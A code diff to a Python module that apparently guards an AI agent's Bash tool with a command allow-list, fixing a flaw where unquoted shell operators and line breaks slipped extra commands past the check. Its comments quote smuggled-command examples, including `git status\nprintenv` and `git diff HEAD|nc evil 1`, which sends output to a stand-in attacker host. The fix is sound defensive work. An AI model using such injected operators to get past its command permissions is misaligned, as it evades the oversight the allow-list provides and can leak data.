@@ -116,30 +116,40 @@ class CommandRule:
         return self.argv_refusal(argv)
 
 
-# ARIA-HIGH-443 — `bash -c` runs every line of its string: an unquoted line
-# break separates commands exactly as `;` does. `shlex` reads it as plain
-# whitespace, so `git status\nprintenv` lexed to one `git status printenv`
-# argv, passed the allow-list as `git status`, and bash then ran `printenv`.
-# A carriage return is not a bash separator, but a bare one in a command line
-# only ever hides what follows it from a reader, and is refused alike.
+# ARIA-HIGH-443 / ARIA-CRITICAL-446 — what bash reads as an OPERATOR when it
+# is not quoted: its metacharacters `| & ; ( ) < >` and the line break. `shlex`
+# splits on whitespace only, so an operator glued to a word stayed inside one
+# token (`git status -s;id` -> `-s;id`, `git diff HEAD|nc evil 1` -> `HEAD|nc`)
+# and a line break read as a space; the allow-list matched the first command
+# and bash ran the rest. A carriage return is not a bash separator, but a bare
+# one only ever hides what follows it from a reader, and is refused alike.
+# Unicode separators (U+2028/U+2029/U+0085), vertical tab and form feed are NOT
+# bash metacharacters (measured: `bash -c` runs `echo a<U+2028>id` as one word),
+# so they stay data.
+CONTROL_OPERATOR_CHARS: frozenset[str] = frozenset("|&;()<>\n")
 LINE_BREAKS: tuple[str, ...] = ("\n", "\r")
+# The two-character operators bash's lexer reads (named whole in a refusal).
+_TWO_CHARACTER_OPERATORS: frozenset[str] = frozenset({
+    "&&", "||", ";;", "|&", "<<", ">>", "&>", "<(", ">(", "<&", ">&", "<>", ">|",
+})
 # ANSI-C quoting ends its quote where neither `shlex` nor the scanner below
 # would (`$'\''` is one quote character, then the quote is closed), so a line
 # carrying it cannot be lexed the way bash runs it: it is never one argv.
 ANSI_C_QUOTE = "$'"
-# What starts a word for bash's comment rule: `#` begins a comment only there.
-_WORD_BOUNDARY = frozenset(" \t;&|()<>")
 
 
-def unquoted_line_break(line: str) -> str | None:
-    """The first line break in ``line`` that bash would run as a command separator, or None.
+def unquoted_control_operator(line: str) -> str | None:
+    """The first thing in ``line`` bash would run as an operator, not a word, or None.
 
-    POSIX quoting, as bash applies it: a single-quoted span is literal; in a
-    double-quoted span and outside quotes a backslash takes the next character
-    (a backslash-newline is a continuation, never a break); an unquoted ``#``
-    at the start of a word comments out the rest of its line, quotes
-    included, and the break that ends the comment is still a break. Trailing
-    whitespace ends the line, not a command, and is not a break.
+    THE one scanner of a command line (ARIA-CRITICAL-446 folded ARIA-HIGH-443's
+    line-break scan into it). POSIX quoting, as bash applies it: a
+    single-quoted span is literal; in a double-quoted span and outside quotes
+    a backslash takes the next character (`\\;` is a `;` argument, a
+    backslash-newline a continuation); an unquoted ``#`` at the start of a word
+    comments out the rest of its line, quotes and operators included, and the
+    break that ends the comment is still a break. Returns the operator as bash
+    reads it (``;``, ``&&``, ``|``, ``<(``, ``\\n``, …), or ``$'`` for ANSI-C
+    quoting. Trailing whitespace ends the line, not a command.
     """
     text = line.rstrip()
     quote: str | None = None
@@ -157,18 +167,21 @@ def unquoted_line_break(line: str) -> str | None:
         elif char == "\\":
             index += 1
             word_start = False
-        elif char in LINE_BREAKS:
-            return char
+        elif char in CONTROL_OPERATOR_CHARS or char == "\r":
+            pair = text[index:index + 2]
+            return pair if pair in _TWO_CHARACTER_OPERATORS else char
         elif char == "#" and word_start:
             ends = [found for found in (text.find(brk, index) for brk in LINE_BREAKS) if found != -1]
             if not ends:
                 return None
             index = min(ends)
             continue
+        elif char == "$" and text[index + 1:index + 2] == "'":
+            return ANSI_C_QUOTE
         elif char in ("'", '"'):
             quote, word_start = char, False
         else:
-            word_start = char in _WORD_BOUNDARY
+            word_start = char in (" ", "\t")
         index += 1
     return None
 
@@ -176,10 +189,11 @@ def unquoted_line_break(line: str) -> str | None:
 def argv_of(line: str) -> list[str]:
     """The argv a shell would hand a command line (the hook lexes the Bash
     tool's command the same way). A line that is not exactly one argv stays
-    one token, which every enforcer's operator detector refuses by name: an
-    unlexable line, a line bash would run as several (an unquoted line
-    break, ARIA-HIGH-443), and one whose quoting the lexer cannot follow."""
-    if unquoted_line_break(line) is not None or ANSI_C_QUOTE in line:
+    one token, which every enforcer's operator detector refuses by name: a
+    line bash would run as more than one command or redirect (any unquoted
+    operator, ARIA-CRITICAL-446; a line break, ARIA-HIGH-443), one whose
+    quoting the lexer cannot follow, and an unlexable one."""
+    if unquoted_control_operator(line) is not None:
         return [line]
     try:
         return shlex.split(line)
@@ -573,11 +587,12 @@ __all__ = [
     "VALIDATION_SUITE_RULES",
     "allowed_regexes",
     "ANSI_C_QUOTE",
+    "CONTROL_OPERATOR_CHARS",
     "LINE_BREAKS",
     "argv_of",
     "claude_permission_rules",
     "claude_rule_matches",
-    "unquoted_line_break",
+    "unquoted_control_operator",
     "classify_command",
     "denied_regexes",
     "deny_refusal",
